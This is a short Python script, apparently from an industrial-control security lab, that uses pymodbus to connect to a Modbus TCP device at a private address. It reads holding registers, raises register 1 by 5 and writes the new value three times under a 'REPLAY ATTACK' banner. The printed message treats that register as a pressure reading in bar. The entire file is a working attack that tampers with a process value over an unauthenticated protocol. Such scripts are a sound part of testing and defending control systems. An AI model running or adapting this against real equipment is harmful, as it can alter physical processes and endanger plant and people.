from pymodbus.client import ModbusTcpClient
import time
import sys

HOST = "192.168.2.139"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5020

print(f"--- REPLAY ATTACK: port {PORT} ---")
client = ModbusTcpClient(HOST, port=PORT)
client.connect()
before = client.read_holding_registers(0, 4, slave=1)
val = before.registers[1] + 5
client.write_register(1, val, slave=1)
time.sleep(0.3)
client.write_register(1, val, slave=1)
time.sleep(0.3)
client.write_register(1, val, slave=1)
print(f"Replayed write {val/10:.1f} bar three times.")
client.close()
